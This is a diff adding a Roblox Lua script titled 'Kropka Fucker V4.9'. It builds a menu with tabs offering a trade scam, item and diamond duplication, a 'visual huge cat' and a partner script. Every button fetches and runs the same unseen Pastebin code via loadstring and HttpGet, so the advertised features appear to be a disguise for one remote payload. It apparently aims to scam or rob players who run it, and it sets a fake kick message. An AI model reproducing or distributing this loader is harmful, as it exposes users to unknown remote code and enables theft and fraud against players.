@@ -1,0 +1,94 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local player = game.Players.localPlayer
+local Window = OrionLib:MakeWindow({Name = "Kropka Fucker V4.9", HidePremium = false, SaveConfig = true, IntoEnable = false})
+
+
+function MakeScriptHub()
+    local Window = OrionLib:MakeWindow({Name = "Kropka Fucker", HidePremium = false, SaveConfig = true, IntroEnable = true, Introtext = "Script Hub"})
+end
+local Tab = Window:MakeTab({
+	Name = "TradeScam",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Tradescam",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Discord Server",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Ur discord server",
+    Callback = function()
+        print("copied in clipboard")
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Dupe",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click here to dupe (only huges/exc).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Visual Huge Cat",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click to have visual huge cat. ( Only you can see it.)",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Gems dupe",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "click here to dupe your diamonds.",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Partner script",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Need to be like a youtuber, display name. press press to open",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+_G.KickMsg = "You've been kicked for hacking, pls rejoin later."
